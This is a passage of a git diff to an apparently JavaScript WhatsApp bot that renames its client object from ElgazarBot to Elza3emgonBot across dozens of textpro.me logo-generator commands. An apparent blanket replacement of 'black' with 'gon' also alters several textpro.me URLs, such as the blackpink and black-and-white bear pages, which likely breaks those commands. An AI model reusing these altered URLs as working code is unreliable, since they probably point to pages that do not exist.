 maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2389,7 +2390,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
    
@@ -2398,16 +2399,16 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
-   case 'blackpinkneon':
+   case 'gonpinkneon':
 if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
-maker.textpro("https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html", [
+maker.textpro("https://textpro.me/create-neon-light-gonpink-logo-text-effect-online-1081.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2419,7 +2420,7 @@ teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
 maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2430,16 +2431,16 @@ teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
 maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
-case 'blackpink2':
+case 'gonpink2':
 if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
-maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
+maker.textpro("https://textpro.me/create-gonpink-logo-style-online-1001.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2448,7 +2449,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2459,7 +2460,7 @@ teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
 maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2470,7 +2471,7 @@ teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
 maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2481,7 +2482,7 @@ teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
 maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2492,7 +2493,7 @@ teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
 maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2501,7 +2502,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2510,7 +2511,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2519,7 +2520,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
     
@@ -2528,7 +2529,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
    
@@ -2539,7 +2540,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2551,9 +2552,9 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
-maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
+maker.textpro("https://textpro.me/online-gon-and-white-bear-mascot-logo-creation-1012.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2565,7 +2566,7 @@ teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
 maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2574,7 +2575,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2583,7 +2584,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
    
@@ -2592,7 +2593,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2601,7 +2602,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2610,7 +2611,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
    
@@ -2619,7 +2620,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break 
 
@@ -2628,7 +2629,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2637,7 +2638,7 @@ if(!q) throw`Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2647,11 +2648,11 @@ if (args.length < 1) throw `Example :\n${prefix + command} <name>`
 if (args[0] === 'glitch') {
 if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
 let teds = await thiccysapi.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [args[1]])
-ElgazarBot.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
 } else if (args[0] === 'glow') {
 if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
 let teds = await thiccysapi.textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html", [args[1]])
-ElgazarBot.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
 } else {
 m.reply(`*Text Maker List :*\n•> glitch\n•> glow`)
 }
@@ -2663,16 +2664,16 @@ case 'hoorror':{
      let anui = await textpro(link, q)
      m.reply(`Wait a moment while making the logo about 1 minute`) 
      console.log(anui)
-    ElgazarBot.sendMessage(from, {image:{url:anui}, caption:"Here you go!"}, {quoted:m})
+    Elza3emgonBot.sendMessage(from, {image:{url:anui}, caption:"Here you go!"}, {quoted:m})
 }
    break
 case 'whitebear':
    
 if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
-maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
+maker.textpro("https://textpro.me/online-gon-and-white-bear-mascot-logo-creation-1012.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'thunder2':
@@ -2681,7 +2682,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-thunder-text-effect-online-881.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
    break
@@ -2691,7 +2692,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/neon-light-text-effect-online-882.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'matrix2':
@@ -2700,7 +2701,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/matrix-style-text-effect-online-884.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'sky':
@@ -2709,7 +2710,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'magma':
@@ -2718,7 +2719,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-a-magma-hot-text-effect-online-1030.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'sand':
@@ -2727,7 +2728,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'pencil':
@@ -2736,7 +2737,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'graffiti':
@@ -2745,7 +2746,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'metallic':
@@ -2754,7 +2755,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'steel':
@@ -2763,7 +2764,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'harrpotter':
@@ -2772,7 +2773,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'underwater':
@@ -2781,7 +2782,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/3d-underwater-text-effect-generator-online-1013.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'luxury':
@@ -2790,7 +2791,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/3d-luxury-gold-text-effect-online-1003.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'glue2':
@@ -2799,7 +2800,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'fabric':
@@ -2808,7 +2809,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'neonlight':
@@ -2817,7 +2818,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/neon-light-glitch-text-generator-online-1063.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'lava':
@@ -2826,7 +2827,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/lava-text-effect-online-914.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'toxic':
@@ -2835,7 +2836,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/toxic-text-effect-online-901.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'ancient':
@@ -2844,7 +2845,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'christmas2':
@@ -2853,7 +2854,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/sparkles-merry-christmas-text-effect-1054.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'sci_fi':
@@ -2862,7 +2863,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'rainbow':
@@ -2871,7 +2872,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'classic':
@@ -2880,7 +2881,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'watercolor2':
@@ -2889,7 +2890,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'halloweem2':
@@ -2898,7 +2899,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'halloweenfire':
@@ -2907,7 +2908,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/halloween-fire-text-effect-940.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'writing':
@@ -2916,7 +2917,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'foggy':
@@ -2925,7 +2926,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'marvel':
@@ -2934,7 +2935,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
